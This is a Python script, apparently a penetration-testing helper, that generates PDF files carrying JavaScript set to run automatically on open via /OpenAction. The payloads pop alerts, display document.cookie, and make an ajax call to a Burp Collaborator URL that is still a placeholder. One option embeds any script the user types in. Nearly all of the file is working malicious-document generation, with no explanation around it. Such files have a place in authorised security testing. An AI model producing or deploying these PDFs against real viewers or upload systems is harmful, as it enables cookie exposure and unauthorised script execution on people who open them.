import sys
if sys.version_info[0] < 3:
    raise SystemExit("Use Python 3 (or higher) only")    
import io
import bz2
import base64

def create_malpdf1(filename):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7
        1 0 obj
        <</Pages 1 0 R /OpenAction 2 0 R>>
        2 0 obj
        <</S /JavaScript /JS (app.alert(1))
        )>> trailer <</Root 1 0 R>>''')

def create_malpdf2(filename):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7
        1 0 obj
        <</Pages 1 0 R /OpenAction 2 0 R>>
        2 0 obj
        <</S /JavaScript /JS (app.alert(document.cookie))
        )>> trailer <</Root 1 0 R>>''')

def create_malpdf3(filename):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7
        1 0 obj
        <</Pages 1 0 R /OpenAction 2 0 R>>
        2 0 obj
        <</S /JavaScript /JS (
            app.alert(1);
            $.ajax({
                type: "GET",
                url: "", //TODO: BURP COLLAB URL 
                success: function(data){
                    app.alert("OK");
                },
                error: function(xhr, status, error) {
                    app.alert("Error: " + status);
                }
            });
            app.alert(2);
        )>> trailer <</Root 1 0 R>>''')

def create_malpdf_input(filename, cin):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7
        1 0 obj
        <</Pages 1 0 R /OpenAction 2 0 R>>
        2 0 obj
        <</S /JavaScript /JS ('''+cin+'''
        )>> trailer <</Root 1 0 R>>''')

#TODO: args options, add burp collab url option, add install req
if __name__ == "__main__":
    print("[+] Creating PDF files..")
    try: 
        option = int(input("Input option 1 or 2: "))
        if option == 1: 
            create_malpdf1("test.pdf")
            create_malpdf2("test2.pdf")
            create_malpdf3("test3.pdf")
        elif option == 2:
            cin = input("Input script: ")
            create_malpdf_input("test_input.pdf", cin)
        print("[-] Done!")
    except: 
        print("Failed to create, must enter integer value 1 or 2...")